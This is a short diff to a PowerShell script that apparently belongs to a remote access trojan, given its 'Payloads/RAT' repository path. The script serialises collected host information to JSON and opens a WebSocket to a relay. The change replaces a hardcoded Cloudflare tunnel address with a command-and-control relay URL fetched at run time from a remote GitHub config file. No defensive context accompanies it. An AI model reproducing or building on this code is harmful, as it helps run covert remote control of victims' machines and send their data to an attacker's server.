@@ -52,7 +52,11 @@ $infos = @{
 $json = $infos | ConvertTo-Json
 
 $ws = New-Object System.Net.WebSockets.ClientWebSocket
-$uri = [System.Uri]"wss://nodes-cite-plain-thursday.trycloudflare.com/ws"
+
+$configUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/config.json"
+$config = Invoke-RestMethod -Uri $configUrl
+$uri = [System.Uri]"$($config.relay_url)/ws"
+
 $token = [System.Threading.CancellationToken]::None
 
 $task = $ws.ConnectAsync($uri, $token)
